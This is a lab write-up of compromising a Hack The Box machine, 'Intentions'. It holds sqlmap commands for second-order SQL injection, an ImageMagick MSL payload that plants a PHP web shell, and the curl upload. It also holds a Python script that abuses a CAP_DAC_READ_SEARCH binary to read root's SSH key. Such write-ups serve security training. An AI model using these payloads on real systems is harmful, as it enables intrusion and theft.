---
title: Intentions
date: 2026-09-23
description: Hard Linux box chaining second-order SQLi through sqlmap, a hash-login v2 API, and an Imagick MSL webshell, then byte-brute-forcing root's id_rsa with a CAP_DAC_READ_SEARCH scanner.
tags:
  - htb
  - Hard
  - Linux
---

# Initial Recon

```sh
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-23 09:52 -0400
Nmap scan report for intentions.htb (10.129.10.42)
Host is up (0.63s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)
|_  256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
```

Port 80 -> register as user and login. Nothing interesting at first: directories `/storage` and `/admin` returned a **403** error, though we also spotted `/.git` under storage.

There's an **input field** called **Favorite Genres** in the **Your Profile** tab: whatever genre you enter reflects on the feed tab. The genre write goes through a POST api request, and the feed reads it back with a GET api request.

Smells like a second-order sql injection:

> what is second order sqli -> input on one page and the output(reflect) on the other page

# User

Grab the request and save it as **request.txt**:

```request.txt
POST /api/v1/gallery/user/genres HTTP/1.1
Host: intentions.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-XSRF-TOKEN: eyJpdiI6IjVvYVArMHprNTZwclBKTVc0aVFRZ2c9PSIsInZhbHVlIjoiUkl2c1I4TTVPUURWVlZQMXloZHM3RG13UXphNlVKYmxicFk2R0t3NTBBU3YzT2lGSGlTZ2NMeVhsM0lkYU81VHRMREFvcFJKYjZvQ0ZSdGNlYk50Tmo1MmZ5bEpyUjVFanpSR3JXd2sydERaS3M0bWRzSTRQM2Jpak1wY3VTTXMiLCJtYWMiOiIyYmJkYzk5ZWM1YzEwMTRkYzY1NDg5ZjY5ODVlYjgzYWQ4MTI2Y2I2YzEwOWNmZjUxODhkNTMyMjAxYTBmMTNkIiwidGFnIjoiIn0=
Content-Length: 20
Origin: http://intentions.htb
Connection: keep-alive
Referer: http://intentions.htb/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IjVvYVArMHprNTZwclBKTVc0aVFRZ2c9PSIsInZhbHVlIjoiUkl2c1I4TTVPUURWVlZQMXloZHM3RG13UXphNlVKYmxicFk2R0t3NTBBU3YzT2lGSGlTZ2NMeVhsM0lkYU81VHRMREFvcFJKYjZvQ0ZSdGNlYk50Tmo1MmZ5bEpyUjVFanpSR3JXd2sydERaS3M0bWRzSTRQM2Jpak1wY3VTTXMiLCJtYWMiOiIyYmJkYzk5ZWM1YzEwMTRkYzY1NDg5ZjY5ODVlYjgzYWQ4MTI2Y2I2YzEwOWNmZjUxODhkNTMyMjAxYTBmMTNkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlVEQVVCMTlVNnlDcVdmMitkRlVKb2c9PSIsInZhbHVlIjoiNE01MHNUdEF6TUdTbWdNV3VwSTI0bTh2SnZSZThrNEhlR05GRGhPSkZkNVB6bGMrN3Y0MkpET3o0VGw2bGp3b3dPM3hsMkVDekRVTkYvTWk1SU9QUUF0ZUZQdlArZ1BFR3VENTRvN2RIVGZ0MUJ4MW90dUhYaVd2M2w3YVEra1MiLCJtYWMiOiJkMDMxNTdmYTFmMTQwYWNiZDFkYTRkMGQ5NWVjOGI0YTdlY2YxYjMzMWE3MWU0MDM4Njk4ZTUzZTY0MzYyZDIyIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE3OTAxNzIyNTYsImV4cCI6MTc5MDE5Mzg1NiwibmJmIjoxNzkwMTcyMjU2LCJqdGkiOiJiSzBhS2FmblBQcDJKNk1FIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.M8HPZwSNSYWJ7bX_ou5yX3qPHJK7G-Won-gCr4V5IzA
Priority: u=0

{
genres="nature"
}
```

Grab the feed request and save it as **feed.txt**:

```
GET /api/v1/gallery/user/feed HTTP/1.1
Host: intentions.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IkQ4ZTFwV3MzdTBUWEVjUnF3dWovNmc9PSIsInZhbHVlIjoiOUhIUGpxZVJPalF6ZGZJdVo4Q3JyTlo2YUpMM1FhYVJ5K2l1dUY3ODRUWVJpaUpiOVJtOWxIckRVUFZYdUVjNmpXdDhNMURvTm9QYlRsWnd3MzU2RGhOemQyOHZiVnpuYnRmUCtBbjhORHM1eEVsczJPYnRXcUxWVjMxenZHeXMiLCJtYWMiOiIzYmFiZjhhOGRmZDk0ZGZjMjI2MGU4NmRlNDQ0NDY3YjhiZjc0YjIyYmQ3YzVmZjBiNWNiMDhjNjllOGU3ZWIzIiwidGFnIjoiIn0=
Connection: keep-alive
Referer: http://intentions.htb/gallery
Cookie: XSRF-TOKEN=eyJpdiI6IkQ4ZTFwV3MzdTBUWEVjUnF3dWovNmc9PSIsInZhbHVlIjoiOUhIUGpxZVJPalF6ZGZJdVo4Q3JyTlo2YUpMM1FhYVJ5K2l1dUY3ODRUWVJpaUpiOVJtOWxIckRVUFZYdUVjNmpXdDhNMURvTm9QYlRsWnd3MzU2RGhOemQyOHZiVnpuYnRmUCtBbjhORHM1eEVsczJPYnRXcUxWVjMxenZHeXMiLCJtYWMiOiIzYmFiZjhhOGRmZDk0ZGZjMjI2MGU4NmRlNDQ0NDY3YjhiZjc0YjIyYmQ3YzVmZjBiNWNiMDhjNjllOGU3ZWIzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkU0QkJpV2JwNkRIQ2JxSFBMTEJUeFE9PSIsInZhbHVlIjoiVGtpVXYzc205b1c1dSttOStnaDgyZ1hiT09MelBCZEdqalI0WEUrSy92S3REZmMrWVZJSXFFdkpObk5TYStoTExQczBiOEcrdjhwSVNzcnc4VFVUVmkveUFEMnpseGVrUG5FaDcxR3RVR1RsMWhqTjZWZnE2VU16SGhQMzd0bWMiLCJtYWMiOiIxMjMxMjc4M2ZmMzBmOWY3Njc0YjRmNmUyNTY0OWE4NWI5Njc1Y2ZkMjA1NjEyZjI2NjQ3NjFlNzEzNDBmY2E2IiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE3OTAxNzIyNTYsImV4cCI6MTc5MDE5Mzg1NiwibmJmIjoxNzkwMTcyMjU2LCJqdGkiOiJiSzBhS2FmblBQcDJKNk1FIiwic3ViIjoiMjgiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.M8HPZwSNSYWJ7bX_ou5yX3qPHJK7G-Won-gCr4V5IzA
```

### Sqlmap - (performing second order sqli)

```sh
sqlmap -r request.txt --second-req=feed.txt --thread=10 --batch --dbs
```

Whatever argument we give in the genre parameter, spaces get cut — sqlmap suggests `--tamper=space2comment` to mitigate:

```sh
sqlmap -r request.txt --second-req=feed.txt --threads=10 --batch --dbs --tamper=space2comment
```

Now we can customize the payload since we know it uses mysql:

```sh
sqlmap -r request.txt  --second-req=feed.txt --threads=10 --batch --dbms=mysql --tamper=space2comment --tables
```

It fetches the tables in a non-readable format — sqlmap suggests `--no-cast`:

```sh
sqlmap -r request.txt  --second-req=feed.txt --threads=10 --batch --tamper=space2comment --tables --no-cast
```

It dumped tables from information_schema and intentions — the **users** table from the intentions Database looks interesting:

```sh
sqlmap -r request.txt  --second-req=feed.txt --threads=10 --batch --tamper=space2comment -T users --dump  --no-cast
```

```output
1 - steve@intentions.htb - admin - $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa
2 - greg@intentions.htb - admin - $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m
```

2 admin role users, but the passwords are **bcrypt** — hard to crack.

On **burpsuite**, the **login page** uses the **api** for authentication `POST /api/v1/auth/login`:

- Send it to repeater and try **v2** instead of **v1** because v1 is the old version and **v2** is the newer one
- Before that, check where it has a login page with **feroxbuster** — there's one:

```
POST /api/v2/auth/login
```

Can be tested using both **curl** and **burpsuite**:

```sh
curl -X POST http://intentions.htb/api/v2/auth/login 
```

So we can login using the hash on **v2** of the api.

Login either with **burpsuite** or **curl**:

- change the parameter to `hash` and change the POST request api from v1 to v2

Successfully logged in as **steve**!

`/storage` still has a **403** error, but we can check the `/admin` page.

In the admin page a notice says that to mitigate copyright claims they use a php class called **imagick**. It uses an endpoint called **modify**, and it also reveals the path of the image.

A google search reveals the **imagick** class can potentially lead us to RCE:

> Reference - https://kris3c.github.io/article/surprising-imagick-with-rce.html

#### Verifying 
Adding `[10x10]` keeps the **content length** **changing** — confirms we have **access** to the **imagick library**

> **Note**: **MSL** stands for **Magick Scripting Language**, a scripting language used by ImageMagick (image processing software). MSL files are text-based and contain XML-like markup defining image operations — they are not image files themselves, they're scripts that _instruct_ ImageMagick on how to process or create images.

By following the instructions we created a **payload.msl** file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;" />
 <write filename="info:/var/www/html/intentions/storage/app/public/payload.php" />
</image>
```

We use the **caption:** and **info:** schemes to try and obtain a **web shell** — `read` holds the payload and `write` holds the location of the writable source.

We use **curl** for upload — `Go to Inspect -> Network -> Modify request -> Copy Value -> Copy as cURL`.

Actual output we got by copying the value:

```sh
curl 'http://intentions.htb/api/v2/admin/image/modify' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Content-Type: application/json' \
  -H 'X-XSRF-TOKEN: eyJpdiI6IlZxRjI0RVV2a0tVSEtuTmsxTWRWTUE9PSIsInZhbHVlIjoiaURKWkVJVVQ0QkxsMCtLSlp6OEJTMzM3Y21BR1FwNlpTOWR2WFovdzI0dUpRUWhvSmVKSnA3QWcxd0tXTUtvazl4d2doREhqbE5aV0NrdDQ2aFU0eUJDVVpHQkRYY2tJNTdIRjQvMFhNZDVJVVFTclBkcU9nNFF3SUxZUzVESk8iLCJtYWMiOiJmMWIwZjNhMDMwM2VjNjNkYzVjNDE4YzEzYjdhNjFhMzVkODlkNTkyNTRiN2I5MWUxNGI1YzlkOTY2NTY0MGU4IiwidGFnIjoiIn0=' \
  -H 'Origin: http://intentions.htb' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://intentions.htb/admin' \
  -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3OTAxNzIwNTMsImV4cCI6MTc5MDE5MzY1MywibmJmIjoxNzkwMTcyMDUzLCJqdGkiOiJHd01wQ1dMOVlPbTBqd2ZGIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.y_FyhcyxR8kXm50sJaKTXKltPnU4Wpdy7BRNKWDDvEU; XSRF-TOKEN=eyJpdiI6IlZxRjI0RVV2a0tVSEtuTmsxTWRWTUE9PSIsInZhbHVlIjoiaURKWkVJVVQ0QkxsMCtLSlp6OEJTMzM3Y21BR1FwNlpTOWR2WFovdzI0dUpRUWhvSmVKSnA3QWcxd0tXTUtvazl4d2doREhqbE5aV0NrdDQ2aFU0eUJDVVpHQkRYY2tJNTdIRjQvMFhNZDVJVVFTclBkcU9nNFF3SUxZUzVESk8iLCJtYWMiOiJmMWIwZjNhMDMwM2VjNjNkYzVjNDE4YzEzYjdhNjFhMzVkODlkNTkyNTRiN2I5MWUxNGI1YzlkOTY2NTY0MGU4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkFuaHpBNG5kVUc3ZzMrQzdUZlkyNHc9PSIsInZhbHVlIjoiS0x0bmtrc1VlMEh6dy9ZWk92T1RRZnNieUZrUFBVSDV0QVcrejhwL3lwYVFpbG1Dd2hxcEhKcFJnN1dCYlJ5OXNSaUVvNjNYRi9qV1Fwc3VWNkpvREdLbkRQbDdzNC8wOHB3aFl2R1hrUWRQeEMrQW9RRkhuSnFqMDM3Y3JrN3ciLCJtYWMiOiJhN2YwYWNmZGM3MGYxOGM0ZWEyZDlhMWMwOGE4NDdhZDBkYTgyZmEyNzgzY2IxMGVkNTc1M2FhNTRiYWJkZjRmIiwidGFnIjoiIn0%3D' \
  -H 'Priority: u=0' \
  --data-raw '{"path":"/var/www/html/intentions/storage/app/public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg","effect":"charcoal"}'
```

Modified payload according to the reference — remove all the headers except **X-XSRF-TOKEN** and **cookie**:

```sh
curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IlZxRjI0RVV2a0tVSEtuTmsxTWRWTUE9PSIsInZhbHVlIjoiaURKWkVJVVQ0QkxsMCtLSlp6OEJTMzM3Y21BR1FwNlpTOWR2WFovdzI0dUpRUWhvSmVKSnA3QWcxd0tXTUtvazl4d2doREhqbE5aV0NrdDQ2aFU0eUJDVVpHQkRYY2tJNTdIRjQvMFhNZDVJVVFTclBkcU9nNFF3SUxZUzVESk8iLCJtYWMiOiJmMWIwZjNhMDMwM2VjNjNkYzVjNDE4YzEzYjdhNjFhMzVkODlkNTkyNTRiN2I5MWUxNGI1YzlkOTY2NTY0MGU4IiwidGFnIjoiIn0=' -H 'Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3OTAxNzIwNTMsImV4cCI6MTc5MDE5MzY1MywibmJmIjoxNzkwMTcyMDUzLCJqdGkiOiJHd01wQ1dMOVlPbTBqd2ZGIiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.y_FyhcyxR8kXm50sJaKTXKltPnU4Wpdy7BRNKWDDvEU; XSRF-TOKEN=eyJpdiI6IlZxRjI0RVV2a0tVSEtuTmsxTWRWTUE9PSIsInZhbHVlIjoiaURKWkVJVVQ0QkxsMCtLSlp6OEJTMzM3Y21BR1FwNlpTOWR2WFovdzI0dUpRUWhvSmVKSnA3QWcxd0tXTUtvazl4d2doREhqbE5aV0NrdDQ2aFU0eUJDVVpHQkRYY2tJNTdIRjQvMFhNZDVJVVFTclBkcU9nNFF3SUxZUzVESk8iLCJtYWMiOiJmMWIwZjNhMDMwM2VjNjNkYzVjNDE4YzEzYjdhNjFhMzVkODlkNTkyNTRiN2I5MWUxNGI1YzlkOTY2NTY0MGU4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkFuaHpBNG5kVUc3ZzMrQzdUZlkyNHc9PSIsInZhbHVlIjoiS0x0bmtrc1VlMEh6dy9ZWk92T1RRZnNieUZrUFBVSDV0QVcrejhwL3lwYVFpbG1Dd2hxcEhKcFJnN1dCYlJ5OXNSaUVvNjNYRi9qV1Fwc3VWNkpvREdLbkRQbDdzNC8wOHB3aFl2R1hrUWRQeEMrQW9RRkhuSnFqMDM3Y3JrN3ciLCJtYWMiOiJhN2YwYWNmZGM3MGYxOGM0ZWEyZDlhMWMwOGE4NDdhZDBkYTgyZmEyNzgzY2IxMGVkNTc1M2FhNTRiYWJkZjRmIiwidGFnIjoiIn0%3D' -F 'path=vid:msl:/tmp/php*' -F 'effect=charcoal' -F file=@payload.msl
```

`-F` => Auto assign content headers for multiple content type
`effect` => random value can be given
> **file** and **path** parameters are important

Once executed it returns a **502** bad gateway error.

Check whether the shell's been uploaded:

```URL 
http://intentions.htb/storage/payload.php?cmd=whoami
```

It's working — gained shell as **www-data**

Previously we spotted a **.git** directory in the **/storage** directory.

Navigate to **/storage/.git** and try the logs — no permission, root owns the **.git** folder:

```sh
git log -p 
```

```output
fatal: detected dubious ownership in repository at '/var/www/html/intentions'

To add an exception for this directory, call:
	git config --global --add safe.directory /var/www/html/intentions
```

Running the suggested command errors too:

```sh
git config --global --add safe.directory /var/www/html/intentions

error: could not lock config file /var/www/.gitconfig: Permission denied
```

Our lack of write access in /var/www causes us some issues.

Going through the **git documentation** reveals that **overwriting** the **$HOME** environmental variable lets us get our way:

```sh
HOME=/tmp git config --global --add safe.directory /var/www/html/intentions

HOME=/tmp git log -p
```

Now we can read through the logs and spot a **password** for the user greg:

> `greg - Gr3g1sTh3B3stDev3l0per!1998!`

Login as greg and we gained the user flag.

# Root 

In **greg**'s directory there are two files:
- `dmca_check.sh`
- `dmca_hashes.test`

```sh
cat dmca_check.sh

/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```

Running the script or executing the absolute path of the binary works the same:

```sh
/opt/scanner/scanner
```

It explains the functionality of the scanner.

**Summary** :
copyright_scanner is a utility that checks files or directories against an MD5 hash blacklist to identify copyrighted material or duplicate images previously submitted to a platform. It compares file hashes against a `LABEL:MD5` formatted list and outputs matches in the format `[+] {LABEL} matches {FILE}`, or nothing if no matches are found.

We got to know `-l` is used to set byte limit - default 500

The only way left for the binary to have read access to a file we don't have is through **capabilities**:

```sh
getcap /opt/scanner/scanner

/opt/scanner/scanner cap_dac_read_search=ep
```

It has the `cap_dac_read_search` capability — the **scanner** binary can **read** any file on the system regardless of whether our user has **access to the file** or the overall file path.

We can abuse this by brute-forcing the **id-rsa** key with a python script:

```python
import string
import hashlib
import subprocess


base = ""
hasResult = True
hashMap = {}
readFile = "/root/.ssh/id_rsa"


def checkMatch():
    global base
    global hashMap
    result = subprocess.Popen(["/opt/scanner/scanner","-c",readFile,"-h","./hash.log","-l",str(len(base) + 1)], stdout=subprocess.PIPE)
    for line in result.stdout:
        #print(line)
        line = str(line)
        if "[+]" in line:
            check = line.split(" ")
            if len(check) == 4:
                if check[1] in hashMap:
                    base = hashMap[check[1]]
                    return True
        return False


def writeFile(base):
    f = open("hash.log", "w")
    hashmap = {}
    for character in string.printable:
        check = base + character
        checkHash = hashlib.md5(check.encode())
        md5 = checkHash.hexdigest()
        hashMap[md5] = check
        f.write(md5 + ":" + md5)
        f.write("\n")
    f.close()


while hasResult:
    writeFile(base)
    hasResult = checkMatch()

print("Found")
print(base)
print("Done")
```

It character-by-character brute-forces a secret by MD5-hashing `base + each printable char` and asking the external `scanner` binary to match those hashes against `/root/.ssh/id_rsa`, appending whichever character matches. It repeats this loop, extending `base` one character at a time, until no more matches are found and prints the recovered value.

Gained `root`
